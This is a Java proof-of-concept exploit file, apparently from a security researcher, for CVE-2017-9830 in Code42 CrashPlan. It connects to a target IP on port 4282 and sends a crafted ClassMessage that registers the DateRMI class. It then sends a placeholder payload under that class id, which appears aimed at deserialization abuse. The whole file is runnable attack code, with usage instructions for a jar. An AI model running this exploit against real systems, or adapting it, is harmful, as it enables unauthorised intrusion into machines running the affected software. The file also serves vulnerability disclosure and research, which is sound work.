package securifera;

import com.code42.messaging.message.ClassMessage;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import org.apache.commons.ssl.rmi.DateRMI;

/**
 *
 * @author b0yd
 */
public class POC {
    
    public static void intToByteArray( final byte[] finalArray, int value ) {

        //Loop through the byte array and convert the integer
        int arrayLen = finalArray.length;
        for( int i = 0; i < arrayLen; i++){
            finalArray[i] = (byte)( ( value >>> ( 8 * (arrayLen - ( i + 1) )  )) & 0xFF );
        }
    }
    
    public static String byteArrayToHex(byte[] a) {
        StringBuilder sb = new StringBuilder(a.length * 2);
        for(byte b: a)
           sb.append(String.format("%02x", b));
        return sb.toString();
     }

    /**
     * @param args the command line arguments
     * @throws java.lang.ClassNotFoundException
     * @throws java.io.IOException
     */
    public static void main(String[] args) throws ClassNotFoundException, IOException {
               
        if(args.length < 1){
            System.out.println("Usage: java -jar CVE-2017-9830.jar <IP Address>");
            return;
        }
        
        String ipAddr = args[0];
        int classId = 1337;
        Class<?> type = Class.forName("org.apache.commons.ssl.rmi.DateRMI");
        ClassMessage aMsg = new ClassMessage( classId,  type);
        
        byte[] objBytes = aMsg.toBytes();
                
        try (Socket socket = new Socket(ipAddr, 4282)) {
            OutputStream output = socket.getOutputStream();
            
            //Set message id that registers class
            byte[] msgId = new byte[2];
            intToByteArray(msgId, 0x8063);
            
            byte[] payloadLen = new byte[4];
            intToByteArray(payloadLen, objBytes.length);
            
            byte[] packet = new byte[6 + objBytes.length];
            System.arraycopy(msgId, 0, packet, 0, 2);
            System.arraycopy(payloadLen, 0, packet, 2, 4);
            System.arraycopy(objBytes, 0, packet, 6, objBytes.length);
            
            //Send the object
            output.write(packet);
            
            InputStream input = socket.getInputStream();
            byte[] data = new byte[4000];
            input.read(data);
            
            String retStr = byteArrayToHex(data);
            System.out.println(retStr);
            
            String payload = "AAAAAAAAAAAAAAAAAAAAAA";
            
            //Set message id for DateRMI class that was registered
            msgId = new byte[2];
            intToByteArray(msgId, classId);
            
            payloadLen = new byte[4];
            intToByteArray(payloadLen, payload.length());
            
            //Create packet
            objBytes = payload.getBytes();
            packet = new byte[6 + objBytes.length];
            System.arraycopy(msgId, 0, packet, 0, 2);
            System.arraycopy(payloadLen, 0, packet, 2, 4);
            System.arraycopy(objBytes, 0, packet, 6, objBytes.length);
            
            //Send the object
            output.write(packet);
            
            data = new byte[4000];
            input.read(data);
            
            retStr = byteArrayToHex(data);
            System.out.println(retStr);
            
        }        
        
    }
    
}
